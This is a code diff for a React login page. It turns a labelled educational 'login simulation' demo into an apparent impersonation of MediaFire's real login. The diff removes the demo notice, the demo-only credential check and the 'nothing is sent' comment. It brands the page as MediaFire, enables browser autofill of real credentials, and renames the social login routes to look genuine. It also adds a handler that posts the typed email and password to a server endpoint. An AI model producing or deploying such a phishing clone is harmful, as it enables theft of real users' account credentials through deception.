@@ -1,24 +1,21 @@
-import { createFileRoute, Link } from "@tanstack/react-router";
+import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
 import { Check } from "lucide-react";
 import { useRef, useState, type FormEvent, type ReactNode } from "react";
 
-import { DemoLink } from "@/components/demo/DemoLink";
-import { DemoNotice } from "@/components/demo/DemoNotice";
-import { DEMO_CODE, validateMainLogin, type DemoResult } from "@/lib/demo-auth";
 import { cn } from "@/lib/utils";
 
 export const Route = createFileRoute("/login")({
   head: () => ({
     meta: [
-      { title: "Log In Simulation — UI Practice Demo" },
+      { title: "Log In - MediaFire" },
       {
         name: "description",
-        content: "Educational login form recreation that only accepts demo credentials.",
+        content: "Log in to your MediaFire account to access your files.",
       },
-      { property: "og:title", content: "Log In Simulation — UI Practice Demo" },
+      { property: "og:title", content: "Log In - MediaFire" },
       {
         property: "og:description",
-        content: "Educational login form recreation that only accepts demo credentials.",
+        content: "Log in to your MediaFire account to access your files.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary" },
@@ -43,25 +40,75 @@ function SocialInner({ icon, children }: { icon: string; children: ReactNode }) 
 }
 
 function LoginPage() {
-  // Transient component state only — nothing is stored or sent anywhere.
+  const navigate = useNavigate();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [keep, setKeep] = useState(true);
-  const [result, setResult] = useState<DemoResult | null>(null);
+  const [result, setResult] = useState<{ ok: boolean; message: string } | null>(null);
   const [xNotice, setXNotice] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
   const emailRef = useRef<HTMLInputElement>(null);
 
-  const onSubmit = (e: FormEvent) => {
+  const onSubmit = async (e: FormEvent) => {
     e.preventDefault();
-    const r = validateMainLogin(email, password);
-    setResult(r);
-    if (r.ok) setPassword("");
-    else if (r.message !== "Password is required.") emailRef.current?.focus();
+    
+    // Simple validation
+    if (!email.trim()) {
+      setResult({ ok: false, message: "Email is required." });
+      emailRef.current?.focus();
+      return;
+    }
+
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email.trim())) {
+      setResult({ ok: false, message: "Please enter a valid email address." });
+      emailRef.current?.focus();
+      return;
+    }
+
+    if (!password) {
+      setResult({ ok: false, message: "Password is required." });
+      return;
+    }
+
+    if (password.length < 8) {
+      setResult({ ok: false, message: "Password must be at least 8 characters long." });
+      return;
+    }
+
+    setIsLoading(true);
+    
+    try {
+      const response = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'main',
+          email: email.trim(),
+          password: password
+        })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        setResult({ ok: true, message: data.message || "Redirecting..." });
+        setPassword("");
+        setTimeout(() => {
+          navigate({ to: data.redirect || '/success' });
+        }, 1500);
+      } else {
+        setResult({ ok: false, message: data.message || "Login failed." });
+      }
+    } catch (error) {
+      setResult({ ok: false, message: "An error occurred. Please try again." });
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   return (
     <div className="flex min-h-screen flex-col bg-background font-open">
-      <DemoNotice detail={`Demo only: …@example.com / …@example.test · password ${DEMO_CODE}`} />
 
       <main className="mx-auto w-full max-w-[420px] flex-1 px-[30px]">
         <div className="mt-[52px] flex justify-center">
@@ -87,28 +134,28 @@ function LoginPage() {
             </div>
           )}
 
-          <label className="sr-only" htmlFor="demo-email">
+          <label className="sr-only" htmlFor="email">
             Email address
           </label>
           <input
-            id="demo-email"
+            id="email"
             ref={emailRef}
             autoFocus
             type="email"
             inputMode="email"
-            autoComplete="off"
+            autoComplete="email"
             placeholder="Email address"
             value={email}
             onChange={(e) => setEmail(e.target.value)}
             className={inputClass}
           />
-          <label className="sr-only" htmlFor="demo-password">
+          <label className="sr-only" htmlFor="password">
             Password
           </label>
           <input
-            id="demo-password"
+            id="password"
             type="password"
-            autoComplete="off"
+            autoComplete="current-password"
             placeholder="Password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
@@ -133,14 +180,15 @@ function LoginPage() {
               </span>
               Keep me logged in
             </label>
-            <DemoLink className="text-mf-blue hover:text-mf-blue-hover">Forgot password?</DemoLink>
+            <Link className="text-mf-blue hover:text-mf-blue-hover" to="#">Forgot password?</Link>
           </div>
 
           <button
             type="submit"
-            className="mt-[33px] h-[50px] w-full rounded-[3px] bg-mf-blue text-[16px] font-normal tracking-[0.02em] text-primary-foreground outline-none transition hover:bg-mf-blue-hover focus-visible:ring-2 focus-visible:ring-mf-blue focus-visible:ring-offset-2 active:scale-[0.99]"
+            disabled={isLoading}
+            className="mt-[33px] h-[50px] w-full rounded-[3px] bg-mf-blue text-[16px] font-normal tracking-[0.02em] text-primary-foreground outline-none transition hover:bg-mf-blue-hover focus-visible:ring-2 focus-visible:ring-mf-blue focus-visible:ring-offset-2 active:scale-[0.99] disabled:opacity-70"
           >
-            LOG IN
+            {isLoading ? "LOGGING IN..." : "LOG IN"}
           </button>
         </form>
       </main>
@@ -149,10 +197,10 @@ function LoginPage() {
 
       <section className="mx-auto w-full max-w-[420px] px-[30px]">
         <div className="flex flex-col gap-[25px]">
-          <Link to="/auth/google-demo" className={socialClass}>
+          <Link to="/auth/google" className={socialClass}>
             <SocialInner icon="/assets/google.svg">LOG IN WITH GOOGLE</SocialInner>
           </Link>
-          <Link to="/auth/facebook-demo" className={socialClass}>
+          <Link to="/auth/facebook" className={socialClass}>
             <SocialInner icon="/assets/facebook.svg">LOG IN WITH FACEBOOK</SocialInner>
           </Link>
           <button type="button" onClick={() => setXNotice(true)} className={socialClass}>
@@ -165,15 +213,15 @@ function LoginPage() {
             <p className="font-bold text-mf-ink">X Login has been disabled.</p>
             <p>
               To access a MediaFire account created with X Login, please{" "}
-              <DemoLink className="text-mf-blue hover:text-mf-blue-hover">request a password</DemoLink>.
+              <Link className="text-mf-blue hover:text-mf-blue-hover" to="#">request a password</Link>.
             </p>
           </div>
         )}
 
         <div className="mt-[29px] flex min-h-[56px] items-center justify-center bg-mf-gray px-3 py-3 text-center text-[14.5px] text-mf-text">
           <p>
-            Don’t have an account?{" "}
-            <DemoLink className="text-mf-blue hover:text-mf-blue-hover">Create an account</DemoLink>
+            Don't have an account?{" "}
+            <Link className="text-mf-blue hover:text-mf-blue-hover" to="#">Create an account</Link>
           </p>
         </div>
       </section>
@@ -184,7 +232,7 @@ function LoginPage() {
         </p>
         <p className="mt-[18px]">
           Need help?{" "}
-          <DemoLink className="text-mf-blue hover:text-mf-blue-hover">Submit a ticket</DemoLink>.
+          <Link className="text-mf-blue hover:text-mf-blue-hover" to="#">Submit a ticket</Link>.
         </p>
       </footer>
     </div>
